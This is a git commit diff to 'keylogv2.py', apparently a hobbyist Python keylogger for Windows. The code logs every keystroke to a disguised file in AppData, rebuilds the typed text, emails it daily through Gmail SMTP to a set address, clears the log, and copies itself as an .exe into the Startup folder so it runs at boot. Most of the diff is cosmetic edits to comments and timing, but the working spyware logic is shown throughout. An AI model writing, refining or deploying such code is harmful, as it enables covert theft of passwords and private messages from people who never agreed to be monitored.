a8fdcfda7ce0fd9200f5934d0b448cdceac56302
Houssin Ait Ali <44384710+housUnus@users.noreply.github.com>
2021-04-04 18:02:26 +0100

    Update keylogv2.py

--- keylogv2.py
+++ keylogv2.py
@@ -1,18 +1,14 @@
 """
-Made by #HousUnus#
 
 more functionalities
+
+V: 2021/04
 
 txt sended as string traited and clean
 
 run with system start up
 
-* You can convert the .py to .exe from a 32bits system and it will work fine for other versions
-
 """
-
-
-
 
 from pynput.keyboard import Key, Listener
 import logging
@@ -29,42 +25,25 @@ sendedToday = False
 #the path disired of your txt_keys file
 USER_NAME = getpass.getuser()
 log_dir = ("C:/Users/%s/AppData/Systeme.bin"% USER_NAME)
-#i save the content in file name Syseme.bin i test the reading function and it work fine with .bin files it's like .txt
-#to don't have a probleme with a big size in future , we assure that after sending data clean the file
+#i save the content in file named Syseme.bin i tested the reading function and it workd fine with .bin files, it's like .txt
+#to don't have a probleme with a big size in future , the file get cleaned after sending  the data.
 #**************************************************************************************
-#main methode of email sender
-def run():
-    global log_dir
-    while True:
-      t = datetime.datetime.today()
-      future = datetime.datetime(t.year,t.month,t.day,21,0)
-      #if t.hour ==00 and t.minute <12 or t.hour ==00 :
-      if t.hour == 21:
-          sendedToday = False
-          send()
-          if sendedToday == True:
-              future += datetime.timedelta(days=1)
-              #future = datetime.datetime(t.year,t.month,t.day,,0)
-              print((future - t).seconds)
-              f = open(log_dir, 'w') 
-              f.close()
-              time.sleep((future - t).seconds)
 
-#the process of send the msg
+#the process of sending the msg
 def send():
   global sendedToday
   try:
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login("*email to send from", "PASSWORD")
-    server.sendmail("*email to send from", "email to send to it", link())
+    server.login("Email To send from", "password")
+    server.sendmail("Email To send from", "Email receiver", link())
     server.quit()
     sendedToday = True
     return
   except :
     sendedToday = False
     return
-#try link each carachter in each line in one string
+#try to link each carachter in each line in one string
 def link():
     global log_dir
     try :
@@ -75,13 +54,13 @@ def link():
         return ""
     #save only the carachter and some special charachter
     msg = (buffer.replace("'","").replace("\n","").replace("Key.space"," ").replace("Key.caps_lock","^")
-           .replace("Key.ctrl_l","*").replace("Key.backspace","<").replace("Key.right","").replace("Key.left","")
-           .replace("Key.shift","").replace("Key.enter","").replace("Key.alt_r","+"))
+           .replace("Key.ctrl_l"," ").replace("Key.backspace","<").replace("Key.right","").replace("Key.left"," ")
+           .replace("Key.shift"," ").replace("Key.enter","\n").replace("Key.alt_r","ALTGR").replace("Key.tab","   ").replace("Key.alt_l"," "))
     print(msg)
     msg = Upper(msg)
     msg = backD(msg)
     return msg
-#remove the file if the key saved was delete
+#remove the if the key saved was delete
 def backD(msg):
     la = [x for x in msg]
     for j in range(len(la)) :
@@ -89,10 +68,10 @@ def backD(msg):
                     if la[i] =='<':
                             bef = i-1   
                             la.pop(i)
-                            la.pop(bef)
+                            la.pop(bef) 
                             break
     return "".join(la)
-#make the carachter after the KeyLock founde as Upper its not so efficient
+#make the carachter after the KeyLock as Upper its not so efficient
 def Upper(msg):
     la = [x for x in msg]
     count =1
@@ -113,8 +92,8 @@ def Upper(msg):
 #*********************************************************************************************#
 
 #copy the file to somewhere
-#basicly its enough to copy the file to start up
-#its possible to remove the originla file after the processof copying
+#basicly it's enough to copy the file to start up
+#it' s possible to remove the original file after the process of copying
 def save():
     global USER_NAME
     des = ("C:/Users/%s/AppData/values.txt"% USER_NAME)
@@ -125,9 +104,9 @@ def save():
         name = open(des,"w+")
         name.write("1")
         
-        #copying the file to somewhere (in my case the startup path
+        #copying the file to somewhere (in my case the startup path)
 
-        filePath = os.getcwd()+ '\\' + "keylogv2.py"
+        filePath = os.getcwd()+ '\\' + "keylogv2.exe"
         Des_file = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
         shutil.copy2(filePath, Des_file)
     finally:
@@ -135,14 +114,32 @@ def save():
 
 
 #**********************************************"#
-#Scope for starting email sending and saveing the file
+def run():
+    global log_dir
+    while True:
+      time.sleep(60*2)
+      t = datetime.datetime.today()
+      future = datetime.datetime(t.year,t.month,t.day,21,0)
+      #if t.hour ==00 and t.minute <12 or t.hour ==00 :
+      if t.hour == 22:
+          #sendedToday = False
+          send()
+          if sendedToday == True:
+              future += datetime.timedelta(days=1)
+              #future = datetime.datetime(t.year,t.month,t.day,,0)
+              print((future - t).seconds)
+              f = open(log_dir, 'w') 
+              f.close()
+              time.sleep((future - t).seconds)
+
+#Scope for starting email sending and saving the file
 Thread(target = run ).start()
 Thread(target = save ).start()
 #***********************************************#
 
 # keystroke region
 logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(message)s')    
-#main function get the key and saved in a fine 
+#main function get the key and save it in a file
 def on_press(key):
     
      logging.info(str(key))
